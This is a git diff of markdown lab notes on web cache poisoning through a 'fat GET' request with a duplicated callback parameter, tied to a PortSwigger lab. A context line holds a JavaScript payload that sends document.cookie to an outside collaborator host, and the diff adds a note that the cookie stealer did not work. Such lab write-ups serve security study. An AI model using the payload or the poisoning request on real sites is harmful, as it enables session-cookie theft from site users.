@@ -880,14 +880,16 @@ document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 ![countrycode source code](images/countrycode-source-code.png)  
 
 ```
-GET /js/geolocate.js?callback=setCountryCookie&callback=arbitraryFunction HTTP/2
+GET /js/geolocate.js?callback=setCountryCookie&callback=FUZZERFunction; HTTP/2
 ```  
 
 >The function that is called in the response by passing in a duplicate callback parameter is reflected. Notice in response the cache key is still derived from the original callback parameter in the GET request line.  
 
 ![fat-get-request](images/fat-get-request.png)  
 
-[PortSwigger ](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)  
+>Not able to make cookie stealer payload working......  
+
+[PortSwigger Lab: Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)  
   
 -----
 
